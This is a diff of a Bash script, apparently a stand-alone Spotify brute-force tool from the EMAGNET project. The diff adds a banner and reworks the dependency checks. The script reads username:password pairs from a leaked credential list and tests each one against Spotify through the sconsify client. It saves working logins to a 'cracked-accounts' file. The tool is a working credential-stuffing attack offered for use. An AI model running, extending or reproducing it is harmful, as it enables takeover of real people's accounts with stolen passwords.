@@ -35,27 +35,36 @@
 ################################################################################
 
 
-if [[ $EUID -ne "0" ]]; then
-   echo "This tool must be executed by root"
-   exit 1
-fi
 
-if [[ -z ${1} ]]; then
-   echo -e "\nYou must choose at least one database ... "
-   echo -e "\n       Usage: ./$basename$0: database.txt\n"
-   exit 1
-fi
+# This script is meant for EMAGNET, released it as a stand-alone script
+# if anyone just want the spotify bruter or continue with this script
 
-if [[ ! -d "/root/cracked-accounts" ]]; then
-   mkdir -p "/root/cracked-accounts"
-fi
+# BANNER
+banner() {
+cat << "EOF"
+      ___
+     |   |
+    _|___|_
+     (* *)
+    __)#(__
+   ( )...( )(_)             Author: wuseman
+   || |_| ||//              Version: 1.0
+>==() | | ()/
+    _(___)_
+   [-]   [-]
+=====================================================
 
-if [[ ! -f ${1} ]]; then
-   echo -e "$basename$0: internal error -- No such database could be found, exiting..."
-   exit 1
-fi
+EOF
+}
 
-requirements() {
+# COLORZ
+R="\e[1;31m"
+G="\e[1;32m"
+E="\e[0m"
+
+
+
+
 find /usr/include -type d |grep 'libspotify' &> /dev/null
  if [[ "$?" -ne "0" ]]; then
    if [[ -z "$LIBSPOTIFY" ]]; then
@@ -74,32 +83,68 @@ find /usr/include -name "portaudio.h" |xargs grep -v "port" &> /dev/null
        echo -e "$basename$0: internal error -- portaudio is requrired to be installed"
        exit 1
     fi
-}
 
-requirements
 
-./sconsify -version &> /dev/null
-   if [[ "$?" -ne "0" ]]; then
-             printf "%s\n" "...Preparing"
-             wget -q https://nr1.nu/archive/sconsify/linux-x86_64-sconsify-0.6.0-next.zip
-             unzip -q -o "linux-x86_64-sconsify-0.6.0-next.zip"
-             chmod +x ./sconsify
-             printf "%s\n" "...Cleaning up"
-             printf "%s\n" "...All done :)"
-             echo -e "-----------------------------------------------------------"
-             rm "linux*sconsify" &> /dev/null
+
+find /usr/include -type d |grep 'libspotify' &> /dev/null
+  if [[ "$?" -ne "0" ]]; then
+  if [[ -z "$LIBSPOTIFY" ]]; then
+   printf "Libspotify is deprecated but is required for emagnet bruteforcing\nto work, do you have libspotify installed? (YES/no): "
+   read LIBSPOTIFY
+  if ! [[ "$LIBSPOTIFY" = "YES" ]]; then
+   echo "Can't continue until libspotify has been installed.."
+   echo "Exiting.."
+   exit 1
+  fi
+  fi
   fi
 
+
+    ./sconsify -version &> /dev/null
+     if [[ "$?" -ne "0" ]]; then
+      echo "Sconsify is required to be installed before we attacking targets.."
+      read -p "Download and install sconsify (y/N): " installsconsify
+         if [[ "$installsconsify" -eq "y" ]]; then
+           echo -e "Hold on, downloading sconsify.."
+           wget -q --user-agent="${USERAGENT}" "https://github.com/fabiofalci/sconsify/releases/download/next-20180428/linux-x86_64-sconsify-0.6.0-next.zip"
+           echo -e "Unzipping sconsify into current dir.."
+           unzip -q -o "linux-x86_64-sconsify-0.6.0-next.zip"
+           chmod +x ./sconsify
+           echo -e "Cleaning up."
+           rm "linux-x86_64-sconsify-0.6.0-next.zip"
+           echo "All done.."
+           sleep 2
+         else
+           echo -e "$basename$0: internal error -- sconsify is required to be installed.."
+           exit 1
+         fi
+  fi
+
+if [[ ! -d "/root/cracked-accounts" ]]; then
+   mkdir -p "/root/cracked-accounts"
+fi
+
+if [[ ! -f ${1} ]]; then
+   echo -e "$basename$0: internal error -- No such database could be found, exiting..."
+   exit 1
+fi
+
+
+if [[ -z ${1} ]]; then
+   echo -e "\nYou must choose at least one database ... "
+   echo -e "\n       Usage: ./$basename$0: database.txt\n"
+   exit 1
+fi
 
 
 while read line; do
  SPOTIFY_USER="$(echo $line|cut -d: -f1)"
  SPOTIFY_PASS="$(echo $line|cut -d: -f2)"
-         ./sconsify -username="${SPOTIFY_USER}" <<< "${SPOTIFY_PASS}" 2> /dev/null|grep -i -q "bad"
+./sconsify -username="${SPOTIFY_USER}" <<< "${SPOTIFY_PASS}" | grep -i -q "bad"
      if [[ "$?" -eq "0" ]]; then
          echo -e "[\e[1;31m<<\e[0m] - Wrong Password: ${SPOTIFY_USER}:${SPOTIFY_PASS}"
       else
-          echo -e "[\e[1;32m>>\e[0m] - Cracked Password: ${SPOTIFY_USER}:${SPOTIFY_PASS}" 
-          echo -e "${SPOTIFY_USER}:${SPOTIFY_PASS}" >> $HOME/cracked-accounts/spotify-accounts.txt
+         echo -e "[\e[1;32m>>\e[0m] - Cracked Password: ${SPOTIFY_USER}:${SPOTIFY_PASS}" 
+         echo -e "${SPOTIFY_USER}:${SPOTIFY_PASS}" >> $HOME/cracked-accounts/spotify-accounts.txt
       fi
 done < $1
